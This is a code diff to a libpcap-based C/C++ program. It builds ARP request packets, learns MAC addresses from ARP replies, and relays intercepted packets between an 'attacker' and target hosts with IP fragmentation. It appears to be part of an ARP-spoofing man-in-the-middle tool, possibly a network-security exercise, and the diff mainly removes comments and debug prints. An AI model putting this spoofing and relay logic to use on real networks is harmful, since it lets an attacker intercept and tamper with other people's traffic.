@@ -20,8 +20,6 @@ int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_
 
     memcpy(packet.eth_.dmac_, dest_mac, 6);
     memcpy(packet.eth_.smac_, source_mac, 6);
-    // copy_mac(dest_mac, packet.eth_.dmac_);
-    // copy_mac(source_mac, packet.eth_.smac_);
     packet.eth_.type_ = htons(EthHdr::Arp);
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
@@ -45,13 +43,8 @@ int request(const char *dev, pcap_t *pcap, u_int8_t *dest_mac, u_int8_t *source_
 
     memcpy(packet.arp_.smac_, sender_mac, 6);
     memcpy(packet.arp_.sip, sender_ip, 4);
-    // copy_mac(sender_mac, packet.arp_.smac_);
-    // copy_ip(sender_ip, packet.arp_.sip);
-
     memcpy(packet.arp_.tmac_, target_mac, 6);
     memcpy(packet.arp_.tip, target_ip, 4);
-    // copy_mac(target_mac, packet.arp_.tmac_);
-    // copy_ip(target_ip, packet.arp_.tip);
 
     int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
     if (res != 0)
@@ -77,10 +70,8 @@ int reply(const char *dev, pcap_t *pcap, u_int8_t *mac, u_int8_t *ip)
         EthArpPacket *arppkt;
         arppkt = (EthArpPacket *)packet;
 
-        // if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && if_same_ip(arppkt->arp_.sip, ip))
         if (arppkt->eth_.type_ == htons(EthHdr::Arp) && arppkt->arp_.pro_ == htons(EthHdr::Ip4) && (!memcmp(arppkt->arp_.sip, ip, 4)))
         {
-            // copy_mac(arppkt->arp_.smac_, mac);
             memcpy(mac, arppkt->arp_.smac_, 6);
             break;
         }
@@ -192,29 +183,23 @@ int relay(const char *dev, pcap_t *pcap, u_int8_t *attacker_mac, list *targets, 
             {
                 if (!memcmp(pkt->eth_.dmac_, attacker_mac, 6))
                 {
-                    // copy_mac(targets[i].sender_mac, pkt->eth_.dmac_);
-                    // copy_mac(attacker_mac, pkt->eth_.smac_);
                     memcpy(pkt->eth_.dmac_, targets[i].sender_mac, 6);
                     memcpy(pkt->eth_.smac_, attacker_mac, 6);
 
                     int i = 0;
                     int flag = 0;
                     sendsize = header->len;
-                    // memcpy(data, packet + 34, sendsize - 34);
-                    //단위 400 434 int i = 0;
                     while (sendsize > fragment_size + 34)
                     {
                         flag = 1;
-                        printf("before");
-                        print_mac(attacker_mac);
                         for (int j = 0; j < fragment_size; j++)
                         {
                             *((u_char *)pkt + 34 + j) = *(packet + 34 + fragment_size * i + j);
                         }
-                        print_mac(attacker_mac);
                         ip_pkt->ip_.ip_len = htons(fragment_size + 20);
                         ip_pkt->ip_.ip_offset = htons((fragment_size / 8 * i) | 0b0010000000000000);
                         ip_pkt->ip_.ip_check = htons(calc_checksum_ip(&(ip_pkt->ip_)));
+                        printf("sendsize : %d\n", sendsize);
                         int res = pcap_sendpacket(pcap, (u_char *)pkt, fragment_size + 34);
                         if (res != 0)
                         {
